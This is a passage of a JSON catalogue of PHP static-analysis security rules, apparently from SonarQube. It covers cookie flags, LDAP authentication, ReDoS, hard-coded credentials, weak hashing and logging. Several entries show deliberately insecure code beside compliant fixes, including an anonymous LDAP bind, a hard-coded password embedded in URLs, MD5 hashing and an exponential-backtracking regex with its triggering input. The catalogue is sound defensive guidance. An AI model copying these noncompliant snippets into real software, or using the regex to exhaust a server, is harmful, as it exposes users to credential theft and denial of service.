CWE - <a href=\"https://cwe.mitre.org/data/definitions/312\">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE\">COOKIE_USAGE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "php:S3330": {
        "name": "Creating cookies without the \"HttpOnly\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>In <em>php.ini</em> you can specify the flags for the session cookie which is security-sensitive:</p>\n<pre>\nsession.cookie_httponly = 0;  // Sensitive: this sensitive session cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<p>Same thing in PHP code:</p>\n<pre>\nsession_set_cookie_params($lifetime, $path, $domain, true, false);  // Sensitive: this sensitive session cookie is created with the httponly flag (the fifth argument) set to false and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<p>If you create a custom security-sensitive cookie in your PHP code:</p>\n<pre>\n$value = \"sensitive data\";\nsetcookie($name, $value, $expire, $path, $domain, true, false); // Sensitive: this sensitive cookie is created with the httponly flag (the seventh argument) set to false  and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<p>By default <a href=\"https://www.php.net/manual/en/function.setcookie.php\"><code>setcookie</code></a> and <a\nhref=\"https://www.php.net/manual/en/function.setrawcookie.php\"><code>setrawcookie</code></a> functions set <code>httpOnly</code> flag to\n<em>false</em> (the seventh argument) and so cookies can be stolen easily in case of XSS vulnerability:</p>\n<pre>\n$value = \"sensitive data\";\nsetcookie($name, $value, $expire, $path, $domain, true); // Sensitive: a sensitive cookie is created with the httponly flag  (the seventh argument) not defined (by default set to false)\nsetrawcookie($name, $value, $expire, $path, $domain, true); // Sensitive: a sensitive cookie is created with the httponly flag (the seventh argument) not defined  (by default set to false)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsession.cookie_httponly = 1; // Compliant: the sensitive cookie is protected against theft thanks (cookie_httponly=1)\n</pre>\n<pre>\nsession_set_cookie_params($lifetime, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the fifth argument set to true (HttpOnly=true)\n</pre>\n<pre>\n$value = \"sensitive data\";\nsetcookie($name, $value, $expire, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the seventh argument set to true (HttpOnly=true)\nsetrawcookie($name, $value, $expire, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the seventh argument set to true (HttpOnly=true)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1004\">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "php:S3331": {
        "name": "Creating cookies with broadly defined \"domain\" flags is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>A cookie’s domain specifies which websites should be able to read it. Left blank, browsers are supposed to only send the cookie to sites that\nexactly match the sending domain. For example, if a cookie was set by <em>lovely.dream.com</em>, it should only be readable by that domain, and not by\n<em>nightmare.com</em> or even <em>strange.dream.com</em>. If you want to allow sub-domain access for a cookie, you can specify it by adding a dot in\nfront of the cookie’s domain, like so: <em>.dream.com</em>. But cookie domains should always use at least two levels.</p>\n<p>Cookie domains can be set either programmatically or via configuration. This rule raises an issue when any cookie domain is set with a single\nlevel, as in <em>.com</em>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the <code>domain</code> attribute has only one level as domain naming. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> You should check the <code>domain</code> attribute has been set and its value has more than one level of domain nanimg, like:\n  <em>sonarsource.com</em> </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nsetcookie(\"TestCookie\", $value, time()+3600, \"/~path/\", \".com\", 1); // Noncompliant\nsession_set_cookie_params(3600, \"/~path/\", \".com\"); // Noncompliant\n\n// inside php.ini\nsession.cookie_domain=\".com\"; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsetcookie(\"TestCookie\", $value, time()+3600, \"/~path/\", \".myDomain.com\", 1);\nsession_set_cookie_params(3600, \"/~path/\", \".myDomain.com\");\n\n// inside php.ini\nsession.cookie_domain=\".myDomain.com\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "INFO"
      },
      "php:S3338": {
        "name": "\"file_uploads\" should be disabled",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p><code>file_uploads</code> is an on-by-default PHP configuration that allows files to be uploaded to your site. Since accepting <span>candy</span>\nfiles from strangers is inherently dangerous, this feature should be disabled unless it is absolutely necessary for your site.</p>\n<p>This rule raises an issue when <code>file_uploads</code> is not explicitly disabled.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n; php.ini\nfile_uploads=1  ; Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n; php.ini\nfile_uploads=0\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/434\">CWE-434 - Unrestricted Upload of File with Dangerous Type</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S4433": {
        "name": "LDAP connections should be authenticated",
        "htmlDesc": "<p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The\n<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>\n<ul>\n  <li> <em>Anonymous</em> Authentication </li>\n  <li> <em>Unauthenticated</em> Authentication </li>\n  <li> <em>Name/Password</em> Authentication </li>\n</ul>\n<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing\ncredentials.</p>\n<h2>Why is this an issue?</h2>\n<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do\nnot provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted\ndirectory.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact\nvaries depending on the permission obtained on the directory and the type of data it stores.</p>\n<h4>Authentication bypass</h4>\n<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data\nsuch as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the\naffected directory as an identity provider.</p>\n<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>\n<h4>Sensitive information leak</h4>\n<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces\nof information.</p>\n<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to\nperform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>\n<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements\nin some countries. For example, this kind of security event would go against the European GDPR law.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple\nauthentication mechanism.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$ldapconn = ldap_connect(\"ldap.example.com\");\n\nif ($ldapconn) {\n    $ldapbind = ldap_bind($ldapconn); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$ldaprdn  = 'uname';\n$ldappass = 'password';\n\n$ldapconn = ldap_connect(\"ldap.example.com\");\n\nif ($ldapconn) {\n    $ldapbind = ldap_bind($ldapconn, $ldaprdn, $ldappass); // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://datatracker.ietf.org/doc/html/rfc4513#section-5\">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication\n  Methods and Security Mechanisms</a> - Bind operations </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4784": {
        "name": "Using regular expressions is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=phpsecurity%3AS2631'>S2631</a> instead.</p>\n<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021\">CVE-2017-16021</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863\">CVE-2018-13863</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926\">CVE-2018-8926</a> </li>\n</ul>\n<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as\n<code>/(a+)+s/</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with\nevery additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular\nexpression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>\n<p>Evaluating such regular expressions opens the door to <a\nhref=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">Regular expression Denial of Service (ReDoS)</a> attacks.\nIn the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making\nthe service inaccessible to genuine users.</p>\n<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and contains at at least two instances of any of\nthe following characters <code>*+{</code>.</p>\n<p>Example: <code>(a+)*</code></p>\n<p>The following functions are detected as executing regular expressions:</p>\n<ul>\n  <li> <a href=\"http://php.net/manual/en/book.pcre.php\">PCRE</a>: Perl style regular expressions: <a\n  href=\"http://php.net/manual/en/function.preg-filter.php\">preg_filter</a>, <a href=\"http://php.net/manual/en/function.preg-grep.php\">preg_grep</a>,\n  <a href=\"http://php.net/manual/en/function.preg-match-all.php\">preg_match_all</a>, <a\n  href=\"http://php.net/manual/en/function.preg-match.php\">preg_match</a>, <a\n  href=\"http://php.net/manual/en/function.preg-replace-callback.php\">preg_replace_callback</a>, <a\n  href=\"http://php.net/manual/en/function.preg-replace.php\">preg_replace</a>, <a\n  href=\"http://php.net/manual/en/function.preg-split.php\">preg_split</a> </li>\n  <li> <a href=\"http://php.net/manual/en/book.regex.php\">POSIX extended</a>, which are deprecated: <a\n  href=\"http://php.net/manual/en/function.ereg-replace.php\">ereg_replace</a>, <a href=\"http://php.net/manual/en/function.ereg.php\">ereg</a>, <a\n  href=\"http://php.net/manual/en/function.eregi-replace.php\">eregi_replace</a>, <a href=\"http://php.net/manual/en/function.eregi.php\">eregi</a>, <a\n  href=\"http://php.net/manual/en/function.split.php\">split</a>, <a href=\"http://php.net/manual/en/function.spliti.php\">spliti</a>. </li>\n  <li> <a href=\"http://php.net/manual/en/function.fnmatch.php\">fnmatch</a> </li>\n  <li> Any of the multibyte string regular expressions: <a href=\"http://php.net/manual/en/function.mb-eregi-replace.php\">mb_eregi_replace</a>, <a\n  href=\"http://php.net/manual/en/function.mb-ereg-match.php\">mb_ereg_match</a>, <a\n  href=\"http://php.net/manual/en/function.mb-ereg-replace-callback.php\">mb_ereg_replace_callback</a>, <a\n  href=\"http://php.net/manual/en/function.mb-ereg-replace.php\">mb_ereg_replace</a>, <a\n  href=\"http://php.net/manual/en/function.mb-ereg-search-init.php\">mb_ereg_search_init</a>, <a\n  href=\"http://php.net/manual/en/function.mb-ereg-search-pos.php\">mb_ereg_search_pos</a>, <a\n  href=\"http://php.net/manual/en/function.mb-ereg-search-regs.php\">mb_ereg_search_regs</a>, <a\n  href=\"http://php.net/manual/en/function.mb-ereg-search.php\">mb_ereg_search</a>, <a href=\"http://php.net/manual/en/function.mb-ereg.php\">mb_ereg</a>,\n  <a href=\"http://php.net/manual/en/function.mb-eregi-replace.php\">mb_eregi_replace</a>, <a\n  href=\"http://php.net/manual/en/function.mb-eregi.php\">mb_eregi</a> </li>\n</ul>\n<p>Note that <code>ereg*</code> functions have been removed in PHP 7 and <strong>PHP 5 end of life date is the 1st of January 2019. Using PHP 5 is\ndangerous as there will be no security fix</strong>.</p>\n<p>This rule’s goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>\n  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not set the constant <code>pcre.backtrack_limit</code> to a high value as it will increase the resource consumption of PCRE functions.</p>\n<p>Check the error codes of PCRE functions via <code>preg_last_error</code>.</p>\n<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for\nvulnerability reports mentioning the one engine you’re are using. Do not run vulnerable regular expressions on user input.</p>\n<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href=\"https://github.com/google/re2\">Google Re2</a>.</p>\n<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>\n<p>Avoid executing a user input string as a regular expression or use at least <code>preg_quote</code> to escape regular expression characters.</p>\n<h2>Exceptions</h2>\n<p>An issue will be created for the functions <code>mb_ereg_search_pos</code>, <code>mb_ereg_search_regs</code> and <code>mb_ereg_search</code> if and\nonly if at least the first argument, i.e. the $pattern, is provided.</p>\n<p>The current implementation does not follow variables. It will only detect regular expressions hard-coded directly in the function call.</p>\n<pre>\n$pattern = \"/(a+)+/\";\n$result = eregi($pattern, $input);  // No issue will be raised even if it is Sensitive\n</pre>\n<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,\n<code>(a|a?)+</code>.</p>\n<p>It is a good idea to test your regular expression if it has the same pattern on both side of a \"<code>|</code>\".</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">CWE-624 - Executable Regular Expression\n  Error</a> </li>\n  <li> OWASP Regular expression Denial of Service - ReDoS </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n$password = \"65DBGgwe4uazdWQA\"; // Sensitive\n\n$httpUrl = \"https://example.domain?user=user&amp;password=65DBGgwe4uazdWQA\" // Sensitive\n$sshUrl = \"ssh://user:65DBGgwe4uazdWQA@example.domain\" // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n$user = getUser();\n$password = getPassword(); // Compliant\n\n$httpUrl = \"https://example.domain?user=$user&amp;password=$password\" // Compliant\n$sshUrl = \"ssh://$user:$password@example.domain\" // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n$hash = md5($data); // Sensitive\n$hash = sha1($data);   // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// for a password\n$hash = password_hash($password, PASSWORD_BCRYPT); // Compliant\n\n// other context\n$hash = hash(\"sha512\", $data);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4792": {
        "name": "Configuring loggers is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285\">CVE-2018-0285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127\">CVE-2000-1127</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113\">CVE-2017-15113</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742\">CVE-2015-5742</a> </li>\n</ul>\n<p>Logs are useful before, during and after a security incident.</p>\n<ul>\n  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it\n  is the first step to prevent an attack from ever happening. </li>\n  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>\n</ul>\n<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information\nlogged and how they are logged.</p>\n<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives\n  access to them. </li>\n  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>\n  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the\n  user can perform the action as many times as he/she wants. </li>\n  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)\n  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>\n  <li> the logs are only stored locally instead of being backuped or replicated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Check that your production deployment doesn’t have its loggers in \"debug\" mode as it might write sensitive information in logs. </li>\n  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>\n  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the\n  hostname. </li>\n  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the\n  impact is known and limited. </li>\n  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the\n  service are secure too. </li>\n  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control\n  the logged information. An attacker could just repeat a logged action many times. </li>\n</ul>\n<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your\nlogs:</p>\n<ul>\n  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user\n  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>\n  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user\n  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example\n  use all your storage space or compromise your log indexing service. </li>\n  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as\n  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>\n  <li> Monitor the logs for any suspicious activity. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Basic PHP configuration:</p>\n<pre>\nfunction configure_logging() {\n  error_reporting(E_RECOVERABLE_ERROR); // Sensitive\n  error_reporting(32); // Sensitive\n\n  ini_set('docref_root', '1'); // Sensitive\n  ini_set('display_errors', '1'); // Sensitive\n  ini_set('display_startup_errors', '1'); // Sensitive\n  ini_set('error_log', \"path/to/logfile\"); // Sensitive - check logfile is secure\n  ini_set('error_reporting', E_PARSE ); // Sensitive\n  ini_set('error_reporting', 64); // Sensitive\n  ini_set('log_errors', '0'); // Sensitive\n  ini_set('log_errors_max_length', '512'); // Sensitive\n  ini_set('ignore_repeated_errors', '1'); // Sensitive\n  ini_set('ignore_repeated_source', '1'); // Sensitive\n  ini_set('track_errors', '0'); // Sensitive\n\n  ini_alter('docref_root', '1'); // Sensitive\n  ini_alter('display_errors', '1'); // Sensitive\n  ini_alter('display_startup_errors', '1'); // Sensitive\n  ini_alter('error_log', \"path/to/logfile\"); // Sensitive - check logfile is secure\n  ini_alter('error_reporting', E_PARSE ); // Sensitive\n  ini_alter('error_reporting', 64); // Sensitive\n  ini_alter('log_errors', '0'); // Sensitive\n  ini_alter('log_errors_max_length', '512'); // Sensitive\n  ini_alter('ignore_repeated_errors', '1'); // Sensitive\n  ini_alter('ignore_repeated_source', '1'); // Sensitive\n  ini_alter('track_errors', '0'); // Sensitive\n}\n</pre>\n<p>Definition of custom loggers with <code>psr/log</code></p>\n<pre>\nabstract class MyLogger implements \\Psr\\Log\\LoggerInterface { // Sensitive\n    // ...\n}\n\nabstract class MyLogger2 extends \\Psr\\Log\\AbstractLogger { // Sensitive\n    // ...\n}\n\nabstract class MyLogger3 {\n    use \\Psr\\Log\\LoggerTrait; // Sensitive\n    // ...\n}\n</pre>\n<h2>Exceptions</h2>\n<p>No issue will be raised for logger configuration when it follows <a href=\"https://www.loggly.com/ultimate-guide/php-logging-basics/\">recommended\nsettings</a> for production servers. The following examples are all valid:</p>\n<pre>\n  ini_set('docref_root', '0');\n  ini_set('display_errors', '0');\n  ini_set('display_startup_errors', '0');\n\n  error_reporting(0);\n  ini_set('error_reporting', 0);\n\n  ini_set('log_errors', '1');\n  ini_set('log_errors_max_length', '0');\n  ini_set('ignore_repeated_errors', '0');\n  ini_set('ignore_repeated_source', '0');\n  ini_set('track_errors', '1');\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Information Exposure Through Log Files</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
